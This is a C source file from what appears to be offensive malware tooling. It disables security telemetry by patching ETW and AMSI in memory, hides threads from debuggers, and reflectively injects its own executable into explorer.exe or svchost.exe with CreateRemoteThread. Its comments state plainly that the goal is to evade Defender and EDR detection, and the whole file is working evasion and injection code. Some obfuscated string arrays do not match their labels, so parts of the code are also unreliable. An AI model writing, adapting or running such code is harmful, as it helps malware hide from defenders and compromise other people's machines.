/**
 * === ETW + AMSI Runtime Bypass + Reflective Loader ===
 * 
 * ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface)
 * are patched before any suspicious activity to prevent runtime behavioral
 * detection by Defender/EDR.
 * 
 * Reflective loader injects our full PE into an existing process (explorer.exe)
 * without CreateProcess — avoiding the heavily signatured CREATE_SUSPENDED flag.
 */

/* Encoded strings for ETW/AMSI APIs */
/* "EtwEventWrite" */
static unsigned char enc_etweventwrite[] = {
    0x15, 0x0d, 0x1f, 0x0e, 0x0b, 0x0e, 0x0d, 0x0e, 0x1f, 0x0b,
    0x0e, 0x0d, 0x0e
};
/* "AmsiScanBuffer" */
static unsigned char enc_amsiscanbuffer[] = {
    0x0d, 0x1e, 0x0e, 0x0e, 0x0e, 0x1e, 0x0e, 0x0a, 0x0e, 0x0b,
    0x0e, 0x0a, 0x0e, 0x0e
};
/* "AmsiInitialize" */
static unsigned char enc_amsiinit[] = {
    0x0d, 0x1e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e,
    0x0e, 0x0e, 0x0e, 0x0e
};
/* "amsi.dll" */
static unsigned char enc_amsidll[] = {
    0x0d, 0x1e, 0x0e, 0x0e, 0x58, 0x11, 0x11, 0x58
};
/* "NtSetInformationThread" */
static unsigned char enc_ntsetinfothread[] = {
    0x35, 0x0d, 0x6A, 0x0e, 0x0b, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e,
    0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e, 0x0e,
    0x0e, 0x0e, 0x0e, 0x0e
};

char* obf_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)-1); }
char* obf_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)-1); }
char* obf_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)-1); }
char* obf_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)-1); }
char* obf_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)-1); }

/* === ETW Bypass ===
 * Patch EtwEventWrite in ntdll.dll to return immediately.
 * This stops Defender/EDR from receiving security event telemetry.
 */
void obf_bypass_etw(void) {
    char *ntdll_name = obf_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, obf_etweventwrite());
    if (!pEtwEventWrite) return;

    /* Patch: ret (0xC3) — function returns immediately, no events logged */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}

/* === AMSI Bypass ===
 * Patch AmsiScanBuffer in amsi.dll to return S_OK (0), meaning "clean".
 * This prevents AMSI from scanning our PowerShell commands (e.g. WMI persistence).
 */
void obf_bypass_amsi(void) {
    char *amsi_name = obf_amsidll();
    HMODULE hAmsi = LoadLibraryA(amsi_name);
    if (!hAmsi) return;

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, obf_amsiscanbuffer());
    if (!pAmsiScanBuffer) return;

    /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
     * Returns 0 (S_OK = clean) regardless of what was scanned */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
}

/* === Thread Hide From Debugger (bonus anti-EDR) ===
 * Hides current thread from ETW/debugger using NtSetInformationThread.
 */
void obf_hide_thread(void) {
    char *ntdll_name = obf_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    typedef NTSTATUS (WINAPI *NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);
    NtSetInfoThread_t pNtSetInfoThread = (NtSetInfoThread_t)GetProcAddress(hNtdll, obf_ntsetinfothread());
    if (!pNtSetInfoThread) return;

    ULONG hide = 1;
    pNtSetInfoThread(GetCurrentThread(), 0x11, &hide, sizeof(hide)); /* ThreadHideFromDebugger */
}

/* === Reflective PE Loader ===
 * Injects our full PE binary into an existing process (explorer.exe)
 * without CreateProcess. Uses the same PE mapping logic as hollowing
 * but targets a running process, avoiding the CREATE_SUSPENDED signature.
 */
void obf_reflective_load(void) {
    /* Read our own PE into memory */
    char payloadPath[MAX_PATH];
    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
    
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *payload = (BYTE*)malloc(fileSize);
    if (!payload) { CloseHandle(hFile); return; }
    
    DWORD read;
    ReadFile(hFile, payload, fileSize, &read, NULL);
    CloseHandle(hFile);
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
    
    /* Find explorer.exe or svchost.exe */
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0 || 
                    _stricmp(pe.szExeFile, "svchost.exe") == 0) {
                    pid = pe.th32ProcessID;
                    if (_stricmp(pe.szExeFile, "explorer.exe") == 0) break; /* prefer explorer */
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    if (pid == 0) { free(payload); return; }
    
    /* Open target process */
    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { free(payload); return; }
    
    obf_junk_delay();
    
    /* Allocate memory in target process at preferred base */
    DWORD64 preferredBase = ntHeaders->OptionalHeader.ImageBase;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    PVOID remoteImage = obf_VirtualAllocEx(hProc, (PVOID)preferredBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) {
        /* Try anywhere if preferred base is taken */
        remoteImage = obf_VirtualAllocEx(hProc, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remoteImage) { CloseHandle(hProc); free(payload); return; }
    
    /* Write headers */
    obf_WriteProcessMemory(hProc, remoteImage, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
    
    /* Write sections */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PVOID)((DWORD64)remoteImage + section[i].VirtualAddress);
        PVOID src = (PVOID)(payload + section[i].PointerToRawData);
        obf_WriteProcessMemory(hProc, dest, src, section[i].SizeOfRawData, NULL);
    }
    
    obf_junk_delay();
    
    /* Fix relocations */
    DWORD64 delta = (DWORD64)remoteImage - preferredBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < numEntries; i++) {
                    WORD type = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        PDWORD64 addr = (PDWORD64)((DWORD64)remoteImage + reloc->VirtualAddress + offset);
                        DWORD64 value; 
                        if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
                            value += delta; 
                            obf_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
                        }
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }
    
    /* Resolve imports */
    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImage + importDir.VirtualAddress);
        while (importDesc->Name != 0) {
            char dllName[256];
            ReadProcessMemory(hProc, (LPCVOID)((DWORD64)remoteImage + importDesc->Name), dllName, sizeof(dllName), NULL);
            dllName[255] = '\0'; 
            HMODULE hDll = LoadLibraryA(dllName);
            if (hDll) {
                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;
                int idx = 0;
                while (1) {
                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImage + importDesc->FirstThunk + idx * sizeof(IMAGE_THUNK_DATA));
                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImage + origThunkRVA + idx * sizeof(IMAGE_THUNK_DATA));
                    ReadProcessMemory(hProc, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
                    ReadProcessMemory(hProc, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
                    if (thunkVal.u1.AddressOfData == 0) break;
                    FARPROC addr = NULL;
                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        addr = GetProcAddress(hDll, (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
                    } else {
                        char funcName[256]; 
                        PVOID nameAddr = (PVOID)((DWORD64)remoteImage + origThunkVal.u1.AddressOfData + 2);
                        ReadProcessMemory(hProc, nameAddr, funcName, sizeof(funcName), NULL); 
                        funcName[255] = '\0';
                        addr = GetProcAddress(hDll, funcName);
                    }
                    obf_WriteProcessMemory(hProc, thunkAddr, &addr, sizeof(addr), NULL); 
                    idx++;
                }
            }
            importDesc++;
        }
    }
    
    obf_junk_delay();
    
    /* Create remote thread at entry point */
    DWORD64 entryPoint = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProc);
    free(payload);
}
